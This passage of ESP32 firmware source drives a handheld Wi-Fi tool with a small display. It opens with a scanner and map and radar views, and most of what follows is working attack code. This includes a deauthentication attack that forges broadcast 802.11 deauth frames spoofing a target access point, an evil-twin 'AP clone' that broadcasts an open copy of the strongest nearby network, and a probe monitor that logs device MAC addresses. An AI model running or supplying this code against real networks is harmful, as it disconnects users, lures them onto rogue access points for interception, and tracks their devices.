        distances[j + 1] = tempDist;

        String tempNet = networks[j];
        networks[j] = networks[j + 1];
        networks[j + 1] = tempNet;

        int tempRssi = rssiValues[j];
        rssiValues[j] = rssiValues[j + 1];
        rssiValues[j + 1] = tempRssi;
      }
    }
  }

  int maxDisplay = min(8, networkCount);
  for (int i = 0; i < maxDisplay; i++) {
    // Color by distance
    if (distances[i] < 5) tft.setTextColor(ST77XX_RED);
    else if (distances[i] < 15) tft.setTextColor(ST77XX_YELLOW);
    else tft.setTextColor(ST77XX_GREEN);

    tft.setCursor(2, 25 + i * 10);
    String ssid = networks[i];
    if (ssid.length() > 12) ssid = ssid.substring(0, 9) + "...";
    tft.print(ssid);

    tft.setCursor(80, 25 + i * 10);
    tft.print(distances[i], 1);
    tft.print("m");

    tft.setCursor(120, 25 + i * 10);
    tft.print(rssiValues[i]);
  }
}

void show2DMap() {
  // Draw coordinate system
  tft.drawLine(80, 10, 80, 110, ST77XX_WHITE);  // Y axis
  tft.drawLine(10, 60, 150, 60, ST77XX_WHITE);  // X axis
  
  // Draw scale rings
  for (int r = 20; r <= 60; r += 20) {
    tft.drawCircle(80, 60, r, ST77XX_WHITE);
  }
  
  // Plot APs with dynamic positioning based on current RSSI
  for (int i = 0; i < networkCount; i++) {
    // Use BSSID hash for consistent angle, but current distance for radius
    String bssid = WiFi.BSSIDstr(i);
    uint32_t hash = 0;
    for (int j = 0; j < bssid.length(); j++) {
      hash = hash * 31 + bssid.charAt(j);
    }
    
    float angle = (hash % 360) * PI / 180.0; // Convert degrees to radians properly // Consistent angle
    float currentDistance = distances[i]; // Current distance updates in real-time
    
    float channelInfluence = channels[i] * 0.1; // Small influence from channel
    angle += channelInfluence;

// Apply some randomness but keep it consistent per AP
    apX[i] = currentDistance * cos(angle) * (0.8 + (hash % 40) / 100.0);
    apY[i] = currentDistance * sin(angle) * (0.8 + (hash % 40) / 100.0);
    
    int plotX = 80 + (int)(apX[i] * scale);
    int plotY = 60 + (int)(apY[i] * scale);
    
    // Keep within bounds
    plotX = constrain(plotX, 15, 145);
    plotY = constrain(plotY, 15, 105);
    
    // Color by signal strength
    uint16_t color;
    if (rssiValues[i] > -50) color = ST77XX_GREEN;
    else if (rssiValues[i] > -70) color = ST77XX_YELLOW;
    else color = ST77XX_RED;
    
    // Draw AP as filled circle
    tft.fillCircle(plotX, plotY, 2, color);
    
    // Draw SSID if close
    if (distances[i] < 10 && networks[i].length() > 0) {
      tft.setTextColor(color);
      tft.setCursor(plotX + 3, plotY - 3);
      String shortName = networks[i].substring(0, min(4, (int)networks[i].length()));
      tft.print(shortName);
    }
  }
  
  // Draw center point (our position)
  tft.fillCircle(80, 60, 3, ST77XX_CYAN);
}
void showRadarView() {
  // Draw radar circles
  for (int r = 15; r <= 45; r += 15) {
    tft.drawCircle(80, 60, r, ST77XX_GREEN);
  }

  // Draw radar lines
  for (int angle = 0; angle < 360; angle += 45) {
    float rad = angle * PI / 180.0;
    int x1 = 80 + 45 * cos(rad);
    int y1 = 60 + 45 * sin(rad);
    tft.drawLine(80, 60, x1, y1, ST77XX_GREEN);
  }

  // Animate radar sweep
  static int sweepAngle = 0;
  sweepAngle = (sweepAngle + 5) % 360;
  float sweepRad = sweepAngle * PI / 180.0;
  int sweepX = 80 + 45 * cos(sweepRad);
  int sweepY = 60 + 45 * sin(sweepRad);
  tft.drawLine(80, 60, sweepX, sweepY, ST77XX_CYAN);

  // Plot APs as blips
  for (int i = 0; i < networkCount; i++) {
    float distance = min(distances[i], 45.0f);
    float angle = atan2(apY[i], apX[i]);

    int blipX = 80 + distance * cos(angle);
    int blipY = 60 + distance * sin(angle);

    uint16_t color;
    if (rssiValues[i] > -50) color = ST77XX_RED;
    else if (rssiValues[i] > -70) color = ST77XX_YELLOW;
    else color = ST77XX_WHITE;

    tft.fillCircle(blipX, blipY, 1, color);
  }

  // Center dot
  tft.fillCircle(80, 60, 2, ST77XX_GREEN);
}

void powerOptions() {
  fastScreenClear();
  tft.setTextColor(ST77XX_YELLOW);
  tft.setCursor(0, 0);
  tft.println("=== POWER OPTIONS ===");
  tft.println();

  tft.setTextColor(ST77XX_WHITE);
  tft.print("Battery: ");
  if (batteryVoltage > 0) {
    tft.print(batteryVoltage);
    tft.println("V");
  } else {
    tft.println("USB Power");
  }

  tft.print("CPU: ");
  tft.print(getCpuFrequencyMhz());
  tft.println("MHz");

  tft.print("Mode: ");
  tft.println(lowPowerMode ? "LOW POWER" : "NORMAL");

  tft.print("WiFi: ");
  tft.println(WiFi.getMode() == WIFI_OFF ? "OFF" : "ON");

  tft.println();
  tft.setTextColor(ST77XX_CYAN);
  tft.println("LONG press to toggle");
  tft.println("power mode");

  // If long press detected in this menu, toggle power mode
  if (bootLongPress) {
    if (lowPowerMode) {
      exitLowPowerMode();
    } else {
      enterLowPowerMode();
    }
    delay(1000);
    powerOptions();  // Refresh display
  }
}


void fastScreenClear() {
  tft.fillRect(0, 0, 160, 128, ST77XX_BLACK);
}





void wifiScanner() {
  // Check battery before power-hungry operation
  if (batteryVoltage > 0 && batteryVoltage < 3.5) {
    showLowBatteryWarning();
    delay(100);
    goBack();
    return;
  }

  fastScreenClear();
  tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(0, 0);
  tft.println("WiFi Scanner");
  tft.println("Scanning...");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  // Reduce WiFi TX power to save battery
  esp_wifi_set_max_tx_power(44);  // Reduce from default 78

  networkCount = WiFi.scanNetworks(); // Ensure this captures all networks

  if (networkCount == 0) {
    fastScreenClear();
    tft.setTextColor(ST77XX_RED);
    tft.setCursor(0, 0);
    tft.println("No networks found!");
    delay(1000);
    goBack();
    return;
  }

  // Calculate distances and positions for each AP
  for (int i = 0; i < min(networkCount, 50); i++) {
    networks[i] = WiFi.SSID(i);
    rssiValues[i] = WiFi.RSSI(i);
    isSecure[i] = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
    channels[i] = WiFi.channel(i);

    // Calculate distance using enhanced algorithm
    distances[i] = calculateDistanceWithChannel(rssiValues[i], channels[i]);

    // Calculate pseudo-random but consistent position for each AP
    // Use BSSID hash for consistent positioning
    String bssid = WiFi.BSSIDstr(i);
    uint32_t hash = 0;
    for (int j = 0; j < bssid.length(); j++) {
      hash = hash * 31 + bssid.charAt(j);
    }

    float angle = (hash % 628) / 100.0;  // Convert to radians (0-2π)
    apX[i] = distances[i] * cos(angle);
    apY[i] = distances[i] * sin(angle);
  }

  fastScreenClear();
  tft.setCursor(0, 0);
  tft.setTextColor(ST77XX_CYAN);
  tft.print("Found ");
  tft.print(networkCount);
  tft.println(" networks:");

  int maxDisplay = min(networkCount, 9);
  for (int i = 0; i < maxDisplay; i++) {
    if (rssiValues[i] > -50) tft.setTextColor(ST77XX_GREEN);
    else if (rssiValues[i] > -70) tft.setTextColor(ST77XX_YELLOW);
    else tft.setTextColor(ST77XX_RED);

    tft.setCursor(2, 18 + i * 11);
    String ssid = networks[i];
    if (ssid.length() > 10) ssid = ssid.substring(0, 7) + "...";
    tft.print(ssid);

    tft.setCursor(75, 18 + i * 11);
    tft.print(rssiValues[i]);

    tft.setCursor(110, 18 + i * 11);
    tft.print(distances[i], 1);
    tft.print("m");

    if (isSecure[i]) {
      tft.setCursor(145, 18 + i * 11);
      tft.print("*");
    }
  }

  tft.setTextColor(ST77XX_YELLOW);
  tft.setCursor(0, 118);
  tft.println("LONG=back");
}






void deauthMenu() {
  if (networkCount == 0) {
    fastScreenClear();
    tft.setTextColor(ST77XX_RED);
    tft.setCursor(0, 0);
    tft.println("No networks found!");
    tft.println("Run scanner first");
    delay(100);
    goBack();
    return;
  }

  targetNetwork = 0;
  updateDeauthDisplay();
}

void updateDeauthDisplay() {
  fastScreenClear();
  tft.setTextColor(ST77XX_RED);
  tft.setCursor(0, 0);
  tft.println("=== DEAUTH ATTACK ===");

  if (targetNetwork >= 0 && targetNetwork < networkCount) {
    tft.setTextColor(ST77XX_WHITE);
    tft.setCursor(0, 20);
    tft.print("Target: ");
    tft.println(networks[targetNetwork]);

    tft.setCursor(0, 30);
    tft.print("RSSI: ");
    tft.println(rssiValues[targetNetwork]);

    tft.setCursor(0, 40);
    tft.print("Channel: ");
    tft.println(channels[targetNetwork]);

    tft.setCursor(0, 50);
    tft.print("Distance: ");
    tft.print(distances[targetNetwork], 1);
    tft.println("m");

    if (deauthActive) {
      tft.setTextColor(ST77XX_RED);
      tft.setCursor(0, 70);
      tft.println("ATTACK ACTIVE!");
      tft.setCursor(0, 80);
      tft.print("Packets sent: ");
      tft.println((millis() - lastPacket) / 200);
    } else {
      tft.setTextColor(ST77XX_GREEN);
      tft.setCursor(0, 70);
      tft.println("Ready to attack");
    }
  }

  tft.setTextColor(ST77XX_YELLOW);
  tft.setCursor(0, 100);
  tft.println("SHORT=next target");
  tft.setCursor(0, 110);
  tft.println("LONG=toggle attack");
  tft.setCursor(0, 120);
  tft.println("Hold=back");
}

void sendDeauthPacket() {
  if (targetNetwork < 0 || targetNetwork >= networkCount) return;

  // Set WiFi to monitor mode
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channels[targetNetwork], WIFI_SECOND_CHAN_NONE);

  // Deauth packet structure
  uint8_t deauth_packet[26] = {
    0xC0, 0x00,                          // Frame control
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (will be set to AP BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (will be set to AP BSSID)
    0x00, 0x00,                          // Sequence number
    0x07, 0x00                           // Reason code (Class 3 frame received from nonassociated station)
  };

  // Get target BSSID
  uint8_t* bssid = WiFi.BSSID(targetNetwork);
  if (bssid) {
    // Set source and BSSID to target AP
    memcpy(&deauth_packet[10], bssid, 6);
    memcpy(&deauth_packet[16], bssid, 6);

    // Send deauth packet
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
  }

  packetCount++;
}

void probeMonitor() {
  fastScreenClear();
  tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(0, 0);
  tft.println("=== PROBE MONITOR ===");

  probeMonitorActive = true;
  probeCount = 0;

  // Set WiFi to promiscuous mode
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(probePacketHandler);

  updateProbeDisplay();
}

void updateProbeDisplay() {
  tft.fillRect(0, 20, 160, 90, ST77XX_BLACK);

  if (probeMonitorActive) {
    tft.setTextColor(ST77XX_GREEN);
    tft.setCursor(0, 20);
    tft.println("MONITORING ACTIVE");

    tft.setTextColor(ST77XX_WHITE);
    tft.setCursor(0, 40);
    tft.print("Probes detected: ");
    tft.println(probeCount);

    if (lastProbeDevice.length() > 0) {
      tft.setCursor(0, 60);
      tft.print("Last device: ");
      tft.println(lastProbeDevice);
    }
  } else {
    tft.setTextColor(ST77XX_RED);
    tft.setCursor(0, 20);
    tft.println("MONITORING STOPPED");
  }

  tft.setTextColor(ST77XX_YELLOW);
  tft.setCursor(0, 110);
  tft.println("LONG=toggle/back");
}

void probePacketHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!probeMonitorActive) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;

  // Check for probe request frames (subtype 0x04)
  if ((pkt->payload[0] & 0xFC) == 0x40) {
    probeCount++;

    // Extract source MAC address
    char macStr[18];
    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
            pkt->payload[10], pkt->payload[11], pkt->payload[12],
            pkt->payload[13], pkt->payload[14], pkt->payload[15]);

    lastProbeDevice = String(macStr);

    // Update display every 10 probes to avoid flickering
    if (probeCount % 10 == 0) {
      updateProbeDisplay();
    }
  }
}

void apClone() {
  if (networkCount == 0) {
    fastScreenClear();
    tft.setTextColor(ST77XX_RED);
    tft.setCursor(0, 0);
    tft.println("No networks found!");
    tft.println("Run scanner first");
    delay(2000);
    goBack();
    return;
  }

  fastScreenClear();
  tft.setTextColor(ST77XX_MAGENTA);
  tft.setCursor(0, 0);
  tft.println("=== AP CLONE ===");

  // Clone the strongest network
  int strongestAP = 0;
  for (int i = 1; i < networkCount; i++) {
    if (rssiValues[i] > rssiValues[strongestAP]) {
      strongestAP = i;
    }
  }

  cloneSSID = networks[strongestAP];
  cloneBSSID = WiFi.BSSIDstr(strongestAP);

  tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(0, 20);
  tft.print("Cloning: ");
  tft.println(cloneSSID);

  tft.setCursor(0, 30);
  tft.print("Original BSSID: ");
  tft.println(cloneBSSID);

  // Start fake AP
  WiFi.mode(WIFI_AP);
  WiFi.softAP(cloneSSID.c_str(), "");  // Open network

  apCloneActive = true;

  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(0, 50);
  tft.println("FAKE AP ACTIVE!");

  tft.setCursor(0, 60);
  tft.print("IP: ");
  tft.println(WiFi.softAPIP());

  tft.setCursor(0, 70);
  tft.print("Clients: ");
  tft.println(WiFi.softAPgetStationNum());

  tft.setTextColor(ST77XX_YELLOW);
  tft.setCursor(0, 110);
  tft.println("LONG=stop & back");
}

void packetMonitor() {
  fastScreenClear();
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(0, 0);
  tft.println("=== PACKET MONITOR ===");

  packetMonitorActive = true;
  packetCount = 0;

  // Set WiFi to promiscuous mode
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(packetHandler);

  // Cycle through channels
  for (int ch = 1; ch <= 11; ch++) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    delay(100);
  }

  updatePacketDisplay();
}

void updatePacketDisplay() {
  tft.fillRect(0, 20, 160, 90, ST77XX_BLACK);

  if (packetMonitorActive) {
    tft.setTextColor(ST77XX_GREEN);
    tft.setCursor(0, 20);
    tft.println("MONITORING ACTIVE");

    tft.setTextColor(ST77XX_WHITE);
    tft.setCursor(0, 40);
    tft.print("Packets: ");
    tft.println(packetCount);

    tft.setCursor(0, 60);
    tft.print("Rate: ");
    if (millis() - lastPacketTime > 0) {
      tft.print(packetCount * 1000 / (millis() - lastPacketTime));
      tft.println(" p/s");
    } else {
      tft.println("0 p/s");
    }
  } else {
    tft.setTextColor(ST77XX_RED);
    tft.setCursor(0, 20);
    tft.println("MONITORING STOPPED");
  }

  tft.setTextColor(ST77XX_YELLOW);
  tft.setCursor(0, 110);
  tft.println("LONG=toggle/back");
}

void packetHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!packetMonitorActive) return;

  packetCount++;
  lastPacketTime = millis();

  // Update display every 100 packets to avoid flickering
  if (packetCount % 100 == 0) {
    updatePacketDisplay();
  }
}
